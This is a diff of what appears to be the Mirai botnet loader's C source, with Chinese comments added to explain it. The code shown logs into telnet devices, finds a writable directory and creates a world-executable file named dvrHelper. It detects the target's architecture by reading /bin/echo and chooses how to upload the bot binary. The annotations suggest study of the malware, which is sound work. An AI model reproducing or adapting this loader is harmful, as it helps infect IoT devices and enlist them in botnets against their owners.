@@ -387,14 +387,14 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             conn->state_telnet = TELNET_READ_WRITEABLE;
                         break;
                     case TELNET_READ_WRITEABLE:
-                        consumed = connection_consume_written_dirs(conn);   //记录了当前登录用户允许读写的目录
+                        consumed = connection_consume_written_dirs(conn);   //记录了当前登录用户允许读写的目录到conn->info.writedir中
                         if (consumed)
                         {
 #ifdef DEBUG
                             printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
 #endif
                             util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);  //切换到可读写的目录中，准备传输payload
-                            //> file :创建文件名为file的文件
+                            //> file :创建文件名为file的文件【空文件】
                             //创建dvrHelper文件，将该文件的权限修改为777【rwx】
                             util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_COPY_ECHO;
@@ -412,7 +412,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             {
                                 conn->state_telnet = TELNET_DETECT_ARCH;
                                 conn->timeout = 120;
-                                // DO NOT COMBINE THESE
+                                // DO NOT COMBINE THESE【通过cat echo的方式查看target的架构】
                                 util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
                                 util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                             }
@@ -429,6 +429,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             conn->timeout = 15;
+                            //conn->bin是现在真的取出来的二进制文件
                             if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                             {
 #ifdef DEBUG
@@ -473,6 +474,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_UPLOAD_METHODS:
+                        //决定用什么方式来上传，得到上传bot binary【mirai.arch，即mirai目录下编译出来的可执行文件,./mirai/build.sh debug/release telnet】
+                        //但是被重命名为dvrHelper
                         consumed = connection_consume_upload_methods(conn);
 
                         if (consumed)
